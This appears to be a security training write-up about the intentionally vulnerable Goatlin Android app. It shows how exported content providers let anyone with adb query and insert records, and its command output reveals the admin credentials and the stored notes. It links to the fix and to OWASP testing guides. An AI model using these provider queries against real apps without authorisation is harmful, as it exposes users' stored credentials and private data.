M1: Improper Platform Usage
===========================
From the [Android documentation][4]: "_Content providers are one of the primary
building blocks of Android applications, providing content to applications._"
Content providers are mostly used to share data between Android applications,
such as activities, services or receivers. Content providers can have weak
permissions or can be exported for all the apps on the device. Such
misconfiguration can allow the Android app to leak the data used by the Content
provider.

When the Content provider is exported, all the apps can query the Content
provider to retrieve or modify the data. On the [Goatlin app][0], we can
see that a Content provider is defined with the name `.AccountProvider` and
the exported tag is set to true. Here is an extract of the `AndroidManifest`
file:

```xml
<provider
    android:name=".AccountProvider"
    android:authorities="com.cx.goatlin.accounts"
    android:enabled="true"
    android:exported="true" />
```

Looking at the code on the `AccountProvider.kt` class, we can retrieve the
Content URI:

```xml
companion object {
    private val AUTHORITY = "com.cx.goatlin.accounts"
    private val ACCOUNTS_TABLE = "Accounts"
    val CONTENT_URI : Uri = Uri.parse("content://" + AUTHORITY + "/" +
                ACCOUNTS_TABLE)
    private val DATABASE_NAME = "data"
}
```

Then, using the `adb` tool, we can query this provider and even insert data.
Here is simple example allowing a query to the provider in order to retrieve the
accounts stored:

```
$ adb shell content query --uri content://com.cx.goatlin.accounts/Accounts
Row: 0 id=1, username=admin, password=admin
```

We can obtain the admin's credentials in this case.


Here is another example allowing an insertion to add a new account into the
Goatlin app:

```
$ adb shell content insert --uri content://com.cx.goatlin.accounts/Accounts  --bind username:s:kotlin --bind password:s:goat
$ adb shell content query --uri content://com.cx.goatlin.accounts/Accounts
Row: 0 id=1, username=admin, password=admin
Row: 1 id=2, username=kotlin, password=goat
```

Below you can see this is action

{% youtube src="https://www.youtube.com/watch?v=U5czs2s8Ifc" %}{% endyoutube %}

In the same manner, the app leaks a Content provider named `.NotesProvider` for
the notes created by the user.

Here is the definition of the Content provider in the Android manifest:

```xml
<provider
    android:name=".NotesProvider"
    android:authorities="com.cx.goatlin.notes"
    android:enabled="true"
    android:exported="true"></provider>
```

As shown previously, we can obtain the Content URI by analyzing the
`NotesProvider` class:

```kotlin
companion object {
    private val AUTHORITY = "com.cx.goatlin.notes"
    private val NOTES_TABLE = "Notes"
    val CONTENT_URI : Uri = Uri.parse("content://" + AUTHORITY + "/" +
                NOTES_TABLE)
    private val DATABASE_NAME = "data"
}
```

Again, with the `adb` tool, we can query this provider and retrieve the notes
stored:

```
$ adb shell content query --uri content://com.cx.goatlin.notes/Notes
Row: 0 id=1, title=whvw, content=whvw, createdAt=2019-01-07 14:58:32, owner=1
```

For this provider, we can observe that the notes are not stored in clear text
(the title and content of the note should be "test").
This encryption mechanism is further analyzed in the [M5: Insufficient
Cryptography][8] section.

This issue was fixed on [Goatlin][0]: you can find it on
[feature/m1-improper-platform-usage branch][10].

More information about how to test improper platform usage can be found on the
[OWASP Mobile Testing Guide][5] and especially on the [Testing Platorm
Interaction][6] section.

## Resources

### Tools

* [adb][9]
* [apktool][1]
* [jadx][2]
* [jd-gui][3]

### Readings

* [Android documentation: Content Provider][4]
* [Testing Platform Interaction][6]
* [OWASP Mobile Testing Guide][5]
* [OWASP Mobile Top 10 2016: M1 - Improper Platform Usage][7]

[0]: https://github.com/Checkmarx/Goatlin
[1]: https://github.com/skylot/jadx
[2]: http://jd.benow.ca/
[3]: https://ibotpeaches.github.io/Apktool/
[4]: https://developer.android.com/reference/android/content/ContentProvider
[5]: https://www.owasp.org/index.php/OWASP_Mobile_Security_Testing_Guide
[6]: https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md
[7]: https://www.owasp.org/index.php/Mobile_Top_10_2016-M1-Improper_Platform_Usage
[8]: ../m5-insufficient-cryptography
[9]: https://developer.android.com/studio/command-line/adb
[10]: https://github.com/Checkmarx/Goatlin/tree/feature/m1-improper-platform-usage
